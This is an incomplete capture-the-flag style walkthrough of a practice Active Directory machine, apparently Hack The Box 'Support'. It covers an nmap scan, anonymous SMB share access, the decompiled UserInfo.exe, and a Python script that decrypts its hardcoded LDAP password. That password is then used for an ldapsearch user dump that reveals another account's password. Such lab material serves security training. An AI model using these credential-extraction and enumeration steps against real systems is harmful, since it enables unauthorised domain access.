
| Property         | Value                         |
| ---------------- | ----------------------------- |
| **OS**           | Linux / Windows               |
| **Difficulty**   | Easy / Medium / Hard / Insane |
| **Release Date** | YYYY-MM-DD                    |
| **State**        | YYYY-MM-DD                    |
| **IP**           | 10.10.10.X                    |
| **Techniques**   | technique-1, technique-2      |
| **Tags**         | #web #privesc #linux          |

---
## Summary

Brief 2-3 sentence ogverview of the machine and attack path.

---
## Enumeration

### Nmap Scan

```
 nmap -sCV support.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-06 06:50 EDT
Nmap scan report for support.htb (10.129.230.181)
Host is up (0.11s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-06 10:51:00Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-07-06T10:51:07
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.96 seconds

```

### SMB Enumeration

```
smbclient -L //support.htb -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to support.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ smbclient //support.htb/support-tools -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 20 13:01:06 2022
  ..                                  D        0  Sat May 28 07:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022

                4026367 blocks of size 4096. 959242 blocks available
smb: \> get UserInfo.exe.zip
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (328.1 KiloBytes/sec) (average 328.1 KiloBytes/sec)
smb: \> 

```

```
ilspycmd UserInfo.exe
using System;
using System.Collections;
using System.Diagnostics;
using System.DirectoryServices;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using MatthiWare.CommandLine;
using MatthiWare.CommandLine.Abstractions.Command;
using MatthiWare.CommandLine.Core.Attributes;
using UserInfo.Services;

[assembly: CompilationRelaxations(8)]
[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
[assembly: AssemblyTitle("UserInfo")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("")]
[assembly: AssemblyProduct("UserInfo")]
[assembly: AssemblyCopyright("Copyright ©  2022")]
[assembly: AssemblyTrademark("")]
[assembly: ComVisible(false)]
[assembly: Guid("5a280d0b-9fd0-4701-8f96-82e2f1ea9dfb")]
[assembly: AssemblyFileVersion("1.0.0.0")]
[assembly: TargetFramework(".NETFramework,Version=v4.8", FrameworkDisplayName = ".NET Framework 4.8")]
[assembly: AssemblyVersion("1.0.0.0")]
namespace UserInfo
{
        internal class Program
        {
                private static async Task Main(string[] args)
                {
                        CommandLineParser<GlobalOptions> commandLineParser = new CommandLineParser<GlobalOptions>(new CommandLineParserOptions
                        {
                                AppName = "UserInfo.exe"
                        });
                        commandLineParser.DiscoverCommands(Assembly.GetExecutingAssembly());
                        _ = (await commandLineParser.ParseAsync(args)).HasErrors;
                }
        }
        public class GetUserOptions
        {
                [Name("username")]
                [Required(true)]
                [Description("Username")]
                public string UserName { get; set; }
        }
        public class FindUserOptions
        {
                [Name("first")]
                [Description("First name")]
                public string FirstName { get; set; }

                [Name("last")]
                [Description("Last name")]
                public string LastName { get; set; }
        }
        public class GlobalOptions
        {
                [Name("v", "verbose")]
                [DefaultValue(false)]
                [Description("Verbose output")]
                public bool Verbose { get; set; }
        }
}
namespace UserInfo.Services
{
        internal class Protected
        {
                private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

                private static byte[] key = Encoding.ASCII.GetBytes("armando");

                public static string getPassword()
                {
                        byte[] array = Convert.FromBase64String(enc_password);
                        byte[] array2 = array;
                        for (int i = 0; i < array.Length; i++)
                        {
                                array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
                        }
                        return Encoding.Default.GetString(array2);
                }
        }
        internal class LdapQuery
        {
                private DirectoryEntry entry;

                private DirectorySearcher ds;

                public LdapQuery()
                {
                        //IL_0018: Unknown result type (might be due to invalid IL or missing references)
                        //IL_0022: Expected O, but got Unknown
                        //IL_0035: Unknown result type (might be due to invalid IL or missing references)
                        //IL_003f: Expected O, but got Unknown
                        string password = Protected.getPassword();
                        entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
                        entry.set_AuthenticationType((AuthenticationTypes)1);
                        ds = new DirectorySearcher(entry);
                }

                public void query(string first, string last, bool verbose = false)
                {
                        //IL_011e: Unknown result type (might be due to invalid IL or missing references)
                        try
                        {
                                if (first == null && last == null)
                                {
                                        Console.WriteLine("[-] At least one of -first or -last is required.");
                                        return;
                                }
                                string text = ((last == null) ? ("(givenName=" + first + ")") : ((first != null) ? ("(&(givenName=" + first + ")(sn=" + last + "))") : ("(sn=" + last + ")")));
                                if (verbose)
                                {
                                        Console.WriteLine("[*] LDAP query to use: " + text);
                                }
                                ds.set_Filter(text);
                                ds.get_PropertiesToLoad().Add("sAMAccountName");
                                SearchResultCollection val = ds.FindAll();
                                if (val.get_Count() == 0)
                                {
                                        Console.WriteLine("[-] No users identified with that query.");
                                        return;
                                }
                                if (verbose)
                                {
                                        string text2 = "[+] Found " + val.get_Count() + " result";
                                        if (val.get_Count() > 1)
                                        {
                                                text2 += "s";
                                        }
                                        text2 += ":";
                                        Console.WriteLine(text2);
                                }
                                foreach (SearchResult item in val)
                                {
                                        if (verbose)
                                        {
                                                Console.Write("       ");
                                        }
                                        Console.WriteLine(item.get_Properties().get_Item("sAMAccountName").get_Item(0));
                                }
                        }
                        catch (Exception ex)
                        {
                                Console.WriteLine("[-] Exception: " + ex.Message);
                        }
                }

                public void printUser(string username, bool verbose = false)
                {
                        try
                        {
                                if (verbose)
                                {
                                        Console.WriteLine("[*] Getting data for " + username);
                                }
                                ds.set_Filter("sAMAccountName=" + username);
                                ds.get_PropertiesToLoad().Add("pwdLastSet");
                                ds.get_PropertiesToLoad().Add("lastLogon");
                                ds.get_PropertiesToLoad().Add("givenName");
                                ds.get_PropertiesToLoad().Add("sn");
                                ds.get_PropertiesToLoad().Add("mail");
                                SearchResult val = ds.FindOne();
                                if (val == null)
                                {
                                        Console.WriteLine("[-] Unable to locate " + username + ". Please try the find command to get the user's username.");
                                        return;
                                }
                                if (((ReadOnlyCollectionBase)(object)val.get_Properties().get_Item("givenName")).Count > 0)
                                {
                                        Console.WriteLine("First Name:           " + val.get_Properties().get_Item("givenName").get_Item(0));
                                }
                                if (((ReadOnlyCollectionBase)(object)val.get_Properties().get_Item("sn")).Count > 0)
                                {
                                        Console.WriteLine("Last Name:            " + val.get_Properties().get_Item("sn").get_Item(0));
                                }
                                if (((ReadOnlyCollectionBase)(object)val.get_Properties().get_Item("mail")).Count > 0)
                                {
                                        Console.WriteLine("Contact:              " + val.get_Properties().get_Item("mail").get_Item(0));
                                }
                                if (val.get_Properties().Contains("pwdLastSet"))
                                {
                                        Console.WriteLine("Last Password Change: " + DateTime.FromFileTime((long)val.get_Properties().get_Item("pwdLastSet").get_Item(0)));
                                }
                        }
                        catch (Exception ex)
                        {
                                Console.WriteLine("[-] Exception: " + ex.Message);
                        }
                }
        }
}
namespace UserInfo.Commands
{
        public class FindUser : Command<GlobalOptions, FindUserOptions>
        {
                public override void OnConfigure(ICommandConfigurationBuilder builder)
                {
                        builder.Name("find").Description("Find a user");
                }

                public override async Task OnExecuteAsync(GlobalOptions options, FindUserOptions commandOptions, CancellationToken cancellationToken)
                {
                        new LdapQuery().query(commandOptions.FirstName, commandOptions.LastName, options.Verbose);
                }
        }
        public class GetUser : Command<GlobalOptions, GetUserOptions>
        {
                public override void OnConfigure(ICommandConfigurationBuilder builder)
                {
                        builder.Name("user").Description("Get information about a user");
                }

                public override async Task OnExecuteAsync(GlobalOptions options, GetUserOptions commandOptions, CancellationToken cancellationToken)
                {
                        new LdapQuery().printUser(commandOptions.UserName, options.Verbose);
                }
        }
}
```

Decrypting the password:

```python
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"

data = bytearray(base64.b64decode(enc_password))

for i in range(len(data)):
    data[i] = (data[i] ^ key[i % len(key)]) ^ 0xDF
    
try:
    result = data.decode("cp1252")
except UnicodeDecodeError:
    result = data.decode("utf-8", errors="replace")

print(result)

```

recovered credentials:

`ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

---
## Foothold

Enumerating users 

```
ldapsearch -x -H ldap://support.htb -D "ldap@support.htb" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "(&(objectCategory=person)(objectClass=user))"
```


```             
# extended LDIF
#
# LDAPv3
# base <dc=support,dc=htb> with scope subtree
# filter: (&(objectCategory=person)(objectClass=user))
# requesting: ALL
#

# Administrator, Users, support.htb
dn: CN=Administrator,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Administrator
description: Built-in account for administering the computer/domain
distinguishedName: CN=Administrator,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528110156.0Z
whenChanged: 20260713122909.0Z
uSNCreated: 8196
memberOf: CN=Group Policy Creator Owners,CN=Users,DC=support,DC=htb
memberOf: CN=Domain Admins,CN=Users,DC=support,DC=htb
memberOf: CN=Enterprise Admins,CN=Users,DC=support,DC=htb
memberOf: CN=Schema Admins,CN=Users,DC=support,DC=htb
memberOf: CN=Administrators,CN=Builtin,DC=support,DC=htb
uSNChanged: 90151
name: Administrator
objectGUID:: ltGa4T+PO0uTHnjAEEcLlw==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 133028750237139482
lastLogoff: 0
lastLogon: 134284193675479259
logonHours:: ////////////////////////////
pwdLastSet: 133027269567293588
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEIL9AEAAA==
adminCount: 1
accountExpires: 0
logonCount: 75
sAMAccountName: Administrator
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20220528111947.0Z
dSCorePropagationData: 20220528111947.0Z
dSCorePropagationData: 20220528110344.0Z
dSCorePropagationData: 16010101181216.0Z
lastLogonTimestamp: 134284193498605360

# Guest, Users, support.htb
dn: CN=Guest,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Guest
description: Built-in account for guest access to the computer/domain
distinguishedName: CN=Guest,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528110156.0Z
whenChanged: 20220528112053.0Z
uSNCreated: 8197
memberOf: CN=Guests,CN=Builtin,DC=support,DC=htb
uSNChanged: 13091
name: Guest
objectGUID:: lHQIHI+KY06QsghOU1eULw==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
logonHours:: ////////////////////////////
pwdLastSet: 132982103352120821
primaryGroupID: 514
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEIL9QEAAA==
accountExpires: 0
logonCount: 0
sAMAccountName: Guest
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20220528110344.0Z
dSCorePropagationData: 16010101000001.0Z
lastLogonTimestamp: 132982104536495506

# krbtgt, Users, support.htb
dn: CN=krbtgt,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: krbtgt
description: Key Distribution Center Service Account
distinguishedName: CN=krbtgt,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528110343.0Z
whenChanged: 20220528111947.0Z
uSNCreated: 12324
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=support,DC=htb
uSNChanged: 13087
showInAdvancedViewOnly: TRUE
name: krbtgt
objectGUID:: /xb62J8VtUOrxKFMpoVR1g==
userAccountControl: 514
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982094237626330
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEIL9gEAAA==
adminCount: 1
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: krbtgt
sAMAccountType: 805306368
servicePrincipalName: kadmin/changepw
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20220528111947.0Z
dSCorePropagationData: 20220528110344.0Z
dSCorePropagationData: 16010101000416.0Z
msDS-SupportedEncryptionTypes: 0

# ldap, Users, support.htb
dn: CN=ldap,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: ldap
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=ldap,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111146.0Z
whenChanged: 20260713131910.0Z
uSNCreated: 12603
uSNChanged: 90204
company: support
streetAddress: Skipper Bowles Dr
name: ldap
objectGUID:: /6UvjDrNT0GyZFt9CzrgfQ==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 134284224682821858
pwdLastSet: 132982099064620523
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUAQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: ldap
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111146.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 134284223502041266

# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220528111201.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 12630
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099209777070
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: support
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111201.0Z
dSCorePropagationData: 16010101000000.0Z

# smith.rosario, Users, support.htb
dn: CN=smith.rosario,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: smith.rosario
sn: smith
c: US
l: Chapel Hill
st: NC
postalCode: 27514
givenName: rosario
distinguishedName: CN=smith.rosario,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111219.0Z
whenChanged: 20220528111219.0Z
uSNCreated: 12638
uSNChanged: 12653
company: support
streetAddress: Skipper Bowles Dr
name: smith.rosario
objectGUID:: xrmo4GlsuUajfnkG3CBMrg==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099393057986
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: smith.rosario
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111219.0Z
dSCorePropagationData: 16010101000000.0Z
mail: smith.rosario@support.htb

# hernandez.stanley, Users, support.htb
dn: CN=hernandez.stanley,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: hernandez.stanley
sn: hernandez
c: US
l: Chapel Hill
st: NC
postalCode: 27514
givenName: stanley
distinguishedName: CN=hernandez.stanley,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111234.0Z
whenChanged: 20220528111235.0Z
uSNCreated: 12655
uSNChanged: 12670
company: support
streetAddress: Skipper Bowles Dr
name: hernandez.stanley
objectGUID:: L81uL06kXEOWM2Qn8ww2qA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099548708177
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: hernandez.stanley
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111235.0Z
dSCorePropagationData: 16010101000000.0Z
mail: hernandez.stanley@support.htb

# wilson.shelby, Users, support.htb
dn: CN=wilson.shelby,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: wilson.shelby
sn: wilson
c: US
l: Chapel Hill
st: NC
postalCode: 27514
givenName: shelby
distinguishedName: CN=wilson.shelby,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111250.0Z
whenChanged: 20220528111251.0Z
uSNCreated: 12672
uSNChanged: 12687
company: support
streetAddress: Skipper Bowles Dr
name: wilson.shelby
objectGUID:: XbKIVlHxiUa1D5CZfJJG9A==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099703526781
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILVAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: wilson.shelby
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111250.0Z
dSCorePropagationData: 16010101000000.0Z
mail: wilson.shelby@support.htb

# anderson.damian, Users, support.htb
dn: CN=anderson.damian,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: anderson.damian
sn: anderson
c: US
l: Chapel Hill
st: NC
postalCode: 27514
givenName: damian
distinguishedName: CN=anderson.damian,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111305.0Z
whenChanged: 20220528111306.0Z
uSNCreated: 12689
uSNChanged: 12704
company: support
streetAddress: Skipper Bowles Dr
name: anderson.damian
objectGUID:: 3yoA+1yHqUaNkyZV3AwohQ==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099859932951
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILVQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: anderson.damian
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111306.0Z
dSCorePropagationData: 16010101000000.0Z
mail: anderson.damian@support.htb

# thomas.raphael, Users, support.htb
dn: CN=thomas.raphael,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: thomas.raphael
sn: thomas
c: US
l: Chapel Hill
st: NC
postalCode: 27514
givenName: raphael
distinguishedName: CN=thomas.raphael,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111321.0Z
whenChanged: 20220528111322.0Z
uSNCreated: 12706
uSNChanged: 12721
company: support
streetAddress: Skipper Bowles Dr
name: thomas.raphael
objectGUID:: sard51WjwU2UuCtT0BGwug==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982100017745577
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILVgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: thomas.raphael
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111322.0Z
dSCorePropagationData: 16010101000000.0Z
mail: thomas.raphael@support.htb

# levine.leopoldo, Users, support.htb
dn: CN=levine.leopoldo,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: levine.leopoldo
sn: levine
c: US
l: Chapel Hill
st: NC
postalCode: 27514
givenName: leopoldo
distinguishedName: CN=levine.leopoldo,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111337.0Z
whenChanged: 20220528111338.0Z
uSNCreated: 12891
uSNChanged: 12906
company: support
streetAddress: Skipper Bowles Dr
name: levine.leopoldo
objectGUID:: zaT1TYtnNUKvrkK/fHjf0Q==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982100175089241
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILVwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: levine.leopoldo
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111337.0Z
dSCorePropagationData: 16010101000000.0Z
mail: levine.leopoldo@support.htb

# raven.clifton, Users, support.htb
dn: CN=raven.clifton,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: raven.clifton
sn: raven
c: US
l: Chapel Hill
st: NC
postalCode: 27514
givenName: clifton
distinguishedName: CN=raven.clifton,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111352.0Z
whenChanged: 20220528111353.0Z
uSNCreated: 12908
uSNChanged: 12923
company: support
streetAddress: Skipper Bowles Dr
name: raven.clifton
objectGUID:: r4Ljo7fDek6FZN1CBI375w==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982100331339215
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILWAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: raven.clifton
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111353.0Z
dSCorePropagationData: 16010101000000.0Z
mail: raven.clifton@support.htb

# bardot.mary, Users, support.htb
dn: CN=bardot.mary,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: bardot.mary
sn: bardot
c: US
l: Chapel Hill
st: NC
postalCode: 27514
givenName: mary
distinguishedName: CN=bardot.mary,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111408.0Z
whenChanged: 20220528111409.0Z
uSNCreated: 12925
uSNChanged: 12940
company: support
streetAddress: Skipper Bowles Dr
name: bardot.mary
objectGUID:: bp+GlFYgwUiy169DiKxEfg==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982100486339253
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILWQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: bardot.mary
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111408.0Z
dSCorePropagationData: 16010101000000.0Z
mail: bardot.mary@support.htb

# cromwell.gerard, Users, support.htb
dn: CN=cromwell.gerard,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: cromwell.gerard
sn: cromwell
c: US
l: Chapel Hill
st: NC
postalCode: 27514
givenName: gerard
distinguishedName: CN=cromwell.gerard,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111424.0Z
whenChanged: 20220528111424.0Z
uSNCreated: 12942
uSNChanged: 12957
company: support
streetAddress: Skipper Bowles Dr
name: cromwell.gerard
objectGUID:: t5fIUmTNZEmsOEoXkg1PfA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982100642589204
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILWgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: cromwell.gerard
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111424.0Z
dSCorePropagationData: 16010101000000.0Z
mail: cromwell.gerard@support.htb

# monroe.david, Users, support.htb
dn: CN=monroe.david,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: monroe.david
sn: monroe
c: US
l: Chapel Hill
st: NC
postalCode: 27514
givenName: david
distinguishedName: CN=monroe.david,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111439.0Z
whenChanged: 20220528111440.0Z
uSNCreated: 12959
uSNChanged: 12974
company: support
streetAddress: Skipper Bowles Dr
name: monroe.david
objectGUID:: BAScccXiIEKhwgp//rBwwA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982100797120581
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILWwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: monroe.david
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111439.0Z
dSCorePropagationData: 16010101000000.0Z
mail: monroe.david@support.htb

# west.laura, Users, support.htb
dn: CN=west.laura,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: west.laura
sn: west
c: US
l: Chapel Hill
st: NC
postalCode: 27514
givenName: laura
distinguishedName: CN=west.laura,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111455.0Z
whenChanged: 20220528111456.0Z
uSNCreated: 12979
uSNChanged: 12994
company: support
streetAddress: Skipper Bowles Dr
name: west.laura
objectGUID:: bqAMeaq42kGIZbfMnxXxRA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982100954464244
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILXAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: west.laura
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111455.0Z
dSCorePropagationData: 16010101000000.0Z
mail: west.laura@support.htb

